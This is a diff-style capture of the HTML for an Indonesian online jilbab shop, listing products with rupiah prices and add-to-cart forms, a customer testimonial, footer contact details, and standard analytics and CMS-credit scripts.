+																<img src="http://jilbab-afra.com/upload/d_BERIA-UNGU-ANGGUR-300x300_20161213213446_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 17 Ungu Anggur 2XL" title="BERIA 17 Ungu Anggur 2XL"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 17 Ungu Anggur 2XL</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 50.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_637" id="addcart_637" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="637"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="2XL"  /;>
+																																							<a href="#" onClick="$('#addcart_637').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																		<li class="product">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=607');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-18-ungu-terong-607.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_d_d_d_BERIA-UNGU-TERONG-300x300_20161213002823_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 18 Ungu Terong" title="BERIA 18 Ungu Terong"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 18 Ungu Terong</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 45.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_607" id="addcart_607" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="607"  /;>
+																																							<a href="#" onClick="$('#addcart_607').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																		<li class="product">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=609');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-18-ungu-terong-609.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_d_d_d_d_d_BERIA-UNGU-TERONG-300x300_20161213002911_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 18 Ungu Terong" title="BERIA 18 Ungu Terong"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 18 Ungu Terong</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 40.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_609" id="addcart_609" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="609"  /;>
+																																							<a href="#" onClick="$('#addcart_609').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																		<li class="product last">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=641');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-17-ungu-anggur-s-641.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_d_d_d_BERIA-UNGU-ANGGUR-300x300_20161213214522_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 17 Ungu Anggur S" title="BERIA 17 Ungu Anggur S"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 17 Ungu Anggur S</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 40.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_641" id="addcart_641" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  /;>
+													<input type="hidden" name="detail_qty" value="1"  /;>
+													<input type="hidden" name="product_id" value="641"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="S"  /;>
+																																							<a href="#" onClick="$('#addcart_641').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																</ul>
+									</div>
+								</div>
+														
+														<h2>BEST SELLERS OF THE MONTH</h2>
+							<div class="border-line"></div>
+								<div class="ribbon">
+									<div class="products-slider ribbon">
+										<ul class="products ribbon">
+																																	 <li class="product first">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=634');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/amira-03-abu-sedang-s-634.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/Antem-03-Abu-Sedang-500x500_20161213191624_medium2.jpg" border=0 style="margin-top:10px" alt="AMIRA 03 Abu Sedang S" title="AMIRA 03 Abu Sedang S"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">AMIRA 03 Abu Sedang S</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 50.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_634" id="addcart_634" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  />
+													<input type="hidden" name="detail_qty" value="1"  />
+													<input type="hidden" name="product_id" value="634"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="S"  />
+																																							<a href="#" onClick="$('#addcart_634').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																	 <li class="product">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=635');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/amira-02-abu-muda-s-635.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/Antem-02-Abu-Muda-500x500_20161213191801_medium2.jpg" border=0 style="margin-top:10px" alt="AMIRA 02 Abu Muda S" title="AMIRA 02 Abu Muda S"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">AMIRA 02 Abu Muda S</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 50.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_635" id="addcart_635" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  />
+													<input type="hidden" name="detail_qty" value="1"  />
+													<input type="hidden" name="product_id" value="635"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="S"  />
+																																							<a href="#" onClick="$('#addcart_635').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																	 <li class="product">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=633');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/amira-04-hitam-s-633.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/Antem-04-Hitam-500x500_20161213191452_medium2.jpg" border=0 style="margin-top:10px" alt="AMIRA 04 Hitam S" title="AMIRA 04 Hitam S"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">AMIRA 04 Hitam S</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 50.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_633" id="addcart_633" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  />
+													<input type="hidden" name="detail_qty" value="1"  />
+													<input type="hidden" name="product_id" value="633"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="S"  />
+																																							<a href="#" onClick="$('#addcart_633').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																	 <li class="product">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=610');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-18-ungu-terong-xs-610.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_d_d_d_d_d_d_BERIA-UNGU-TERONG-300x300_20161213002938_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 18 Ungu Terong XS" title="BERIA 18 Ungu Terong XS"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 18 Ungu Terong XS</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 35.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_610" id="addcart_610" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  />
+													<input type="hidden" name="detail_qty" value="1"  />
+													<input type="hidden" name="product_id" value="610"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="XS"  />
+																																							<a href="#" onClick="$('#addcart_610').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																	 <li class="product last">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=604');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-19-kuning-kenari-xs-604.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_d_d_d_d_d_BERIA-KUNING-KENARII-300x300_20161213002656_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 19 Kuning Kenari XS" title="BERIA 19 Kuning Kenari XS"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 19 Kuning Kenari XS</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 35.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_604" id="addcart_604" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  />
+													<input type="hidden" name="detail_qty" value="1"  />
+													<input type="hidden" name="product_id" value="604"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="XS"  />
+																																							<a href="#" onClick="$('#addcart_604').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																	 <li class="product first">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=632');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/amira-05-peach-s-632.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/Antem-05-Peach-500x500_20161212170406_20161213191329_medium2.jpg" border=0 style="margin-top:10px" alt="AMIRA 05 Peach S" title="AMIRA 05 Peach S"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">AMIRA 05 Peach S</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 50.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_632" id="addcart_632" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  />
+													<input type="hidden" name="detail_qty" value="1"  />
+													<input type="hidden" name="product_id" value="632"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="S"  />
+																																							<a href="#" onClick="$('#addcart_632').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																	 <li class="product">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=598');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/beria-20-kuning-kunyit-xs-598.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/d_d_d_d_d_d_BERIA-KUNING-KUNYITT-300x300_20161213002353_medium2.jpg" border=0 style="margin-top:10px" alt="BERIA 20 Kuning Kunyit XS" title="BERIA 20 Kuning Kunyit XS"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">BERIA 20 Kuning Kunyit XS</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 35.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_598" id="addcart_598" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  />
+													<input type="hidden" name="detail_qty" value="1"  />
+													<input type="hidden" name="product_id" value="598"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="XS"  />
+																																							<a href="#" onClick="$('#addcart_598').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																	 <li class="product">
+																								<div class="quickshow" onClick="makeRequestPop('http://jilbab-afra.com/x_page.php','process_container','page=x_show_preview&act=show&page_required=1&id=636');">Lihat sekilas</div>
+																								<a href="http://jilbab-afra.com/detail/amira-01-putih-s-636.html">
+													<div class="thumbnail">
+														<span class="onsale"><img src="http://jilbab-afra.com/logo_n_watermark/1305206066362_spacer.png" border=0 /></span>	
+															<div style="height:158px;display:table;width:100%;">
+																<div style="display:table-cell;vertical-align:middle;text-align:center;">
+																<center>
+																<img src="http://jilbab-afra.com/upload/Antem-01-Putih-500x500_20161213191927_medium2.jpg" border=0 style="margin-top:10px" alt="AMIRA 01 Putih S" title="AMIRA 01 Putih S"/>
+																</center>
+																</div>
+															</div>
+														<div class="thumb-shadow"></div>
+														<strong class="below-thumb">AMIRA 01 Putih S</strong>    	
+													</div>
+																										<span class="price">
+																											<ins><span class="amount">Rp 50.000,-</span></ins></span>
+																								</a>
+																								<div class="buttons">
+													<form name="addcart_636" id="addcart_636" method="post" action="http://jilbab-afra.com/cart">
+													<input type="hidden" name="submitted" value="1"  />
+													<input type="hidden" name="detail_qty" value="1"  />
+													<input type="hidden" name="product_id" value="636"  /;>
+																											<input type="hidden" name="attribute[Ukuran]" value="S"  />
+																																							<a href="#" onClick="$('#addcart_636').submit();" class="add-to-cart">ADD TO CART</a>
+																										</form>
+												</div>
+																							</li>
+																																</ul>
+									</div>
+								</div>
+														<!-- END CONTENT -->
+							
+							<!-- START LATEST NEWS -->
+							<!-- END LATEST NEWS -->  
+							<!-- START EXTRA CONTENT -->
+							<!-- END EXTRA CONTENT -->   
+							<h1 style="text-align: center;">OUR <span>CUSTOMERS</span> SAYS..</h1>
+							<div class="border-line"></div>
+							
+							<div class="testimonials-slider">
+								<ul class="testimonials group">
+																		<li>
+										<blockquote>
+											<p class="special-font"><a>"Respon dan pelayanan dari Customer Sevice yang Online cepat, dan barangnya sampai ditangan saya tepat waktu. Terimakasih..."</a>
+											</p>
+										</blockquote>
+										<p class="meta"><a><strong>Tria</strong></a> - <a href=""></a></p>
+									</li>
+																	</ul>
+								<div class="prev"></div>
+								<div class="next"></div>
+							</div>
+							
+						</div>
+						
+						
+						<script type="text/javascript">
+							$('.testimonials-slider ul').cycle({
+								fx : 'scrollHorz',
+								speed: 500,
+								timeout: 7000,
+								next: '.testimonials-slider .next',
+								prev: '.testimonials-slider .prev'
+							});
+						</script>
+					</div>
+				                
+                <div class="clear"></div>
+
+				<!-- START FOOTER -->
+				
+				<div id="footer" class="sidebar-no">
+				    <div class="group inner footer_row_1 footer_cols_4">
+				        
+				        <div class="widget-first widget popular-posts">
+																						<h3>ARTICLE</h3>
+								<div class="recent-post group">
+																	</div>
+											        </div>
+				        
+				        <div class="widget widget_nav_menu">
+				            <h3>MENU</h3>
+				            <div class="menu-widget-footer-container">
+				                <ul id="menu-widget-footer" class="menu">
+													                    <li class="menu-2-cols"><a href="http://jilbab-afra.com/pages/contact-us-6.html" target="">Contact Us</a></li>
+													                    <li class="menu-2-cols"><a href="http://jilbab-afra.com/pages/how-to-shop-4.html" target="">How to Shop</a></li>
+													                    <li class="menu-2-cols"><a href="http://jilbab-afra.com/pages/bank-account-41.html" target="">Bank Account</a></li>
+													                    <li class="menu-2-cols"><a href="http://jilbab-afra.com/pages/testimonial-15.html" target="">Testimonial</a></li>
+													                    <li class="menu-2-cols"><a href="http://jilbab-afra.com/pages/news-16.html" target="">News</a></li>
+													                    <li class="menu-2-cols"><a href="http://jilbab-afra.com/pages/about-us-3.html" target="">About Us</a></li>
+													                    <li class="menu-2-cols"><a href="http://jilbab-afra.com/pages/payment-confirmation-5.html" target="">Payment Confirmation</a></li>
+													                    <li class="menu-2-cols"><a href="http://jilbab-afra.com/pages/faqs-14.html" target="">FAQs</a></li>
+													                    <li class="menu-2-cols"><a href="http://jilbab-afra.com/pages/articles-17.html" target="">Articles</a></li>
+													                </ul>
+				            </div>
+				        </div>
+				        
+				        <div id="last-tweets-2" class="widget last-tweets">
+				            <h3>CUSTOMER SUPPORT</h3>
+				            <div>
+				            									<br class="clear"/>
+								<div class="sms">SMS / HOTLINE</div>
+																<div>0813-2795-2427 / Hana Amatillah</div>
+																<div>0813-2795-2427 / (WA) Hana Amatillah</div>
+												            </div>
+				        </div>
+				        
+				        <div class="widget-last widget widget_featured_products">
+							<h3>ADDRESS</h3>
+							<p>Jilbab Afra Sidoarjo Jl. Tirta Dahlia 24, Graha Tirta, Ngingas, Waru, Sidoarjo - 61256 Telp : 081427952427</p>
+				        </div>
+				        
+				    </div>
+				</div>
+				
+                <div id="copyright" class="group">
+                    <div class="inner group" >
+						<div style="text-align:center;">
+																							<a href="http://jilbab-afra.com/pages/contact-us-6.html" target="">Contact Us</a>
+																								<span>|</span>
+																<a href="http://jilbab-afra.com/pages/how-to-shop-4.html" target="">How to Shop</a>
+																								<span>|</span>
+																<a href="http://jilbab-afra.com/pages/bank-account-41.html" target="">Bank Account</a>
+																								<span>|</span>
+																<a href="http://jilbab-afra.com/pages/testimonial-15.html" target="">Testimonial</a>
+																								<span>|</span>
+																<a href="http://jilbab-afra.com/pages/news-16.html" target="">News</a>
+																								<span>|</span>
+																<a href="http://jilbab-afra.com/pages/about-us-3.html" target="">About Us</a>
+																								<span>|</span>
+																<a href="http://jilbab-afra.com/pages/payment-confirmation-5.html" target="">Payment Confirmation</a>
+																								<span>|</span>
+																<a href="http://jilbab-afra.com/pages/faqs-14.html" target="">FAQs</a>
+																								<span>|</span>
+																<a href="http://jilbab-afra.com/pages/articles-17.html" target="">Articles</a>
+													</div>
+						<br />
+                        <div class="left">
+                            <div class="newsletter-section">							
+                                <form method="post" action="http://jilbab-afra.com/" onSubmit="if($('#email_newsletter').val() == ''){alert('Email Masih Belum di Isi'); return false;}">
+                                    <fieldset>
+										<input type="hidden" name="newsletter_add" value="1" />
+                                    	<input type="text" PlaceHolder="Newsletter - Masukkan Email" name="email" id="email_newsletter" class="email-field text-field autoclear" />
+                                    	<input type="hidden" id="_mc_submit_signup_form_nonce" name="_mc_submit_signup_form_nonce" value="9911d77bc3" />
+                                    	<input type="submit" value="Subscribe" class="submit-field" />
+                                    </fieldset>
+                                </form>
+                            </div>
+                            <a href="http://facebook.com/afrasidoarjo" class="socials facebook" target="_blank" rel="nofollow" title="Facebook">facebook</a>                                                        <a href="http://google.com" class="socials google" target="_blank" rel="nofollow" title="Google">google</a>                                                                                                                							
+																																			                        </div>
+                        <div class="right">
+                           Jilbab Afra Sidoarjo
+                        </div>
+                    </div>
+					<br />
+					<div id="top" class="affliliasi" style="padding:5px;">
+						<div class="end"></div>
+						<div class="maya"></div>
+					</div>
+                </div>
+                <!-- END FOOTER -->     
+            </div>
+            <!-- END WRAPPER -->        
+        </div>
+        <!-- END SHADOW WRAPPER -->     
+        
+		
+		<div style="display:none;">
+			<div id="process_container"></div>
+		</div>
+		<!--[if lt IE 7]>
+<script type="text/javascript" src="http://jilbab-afra.com/luxy3/templates/js/add_ie.js"></script>
+<![endif]-->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-88735293-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+        
+    </body>
+</html>                <script>
+	$(document).ready(function() {
+		$('.maya').after('<div style="text-align:center;color:#fff;font-size:11px;">CMS <a style="color:#fff;font-size:11px;"href="http://www.jagoanstore.com/"target="_blank">Toko Online</a> by <a href="http://www.jagoanstore.com/" target="_blank"><img src="https://api.jagoanstore.com/images/jagstorecom-lil.png" border=0 align="absmiddle" /></a></div>');
+	});
+	
+</script>
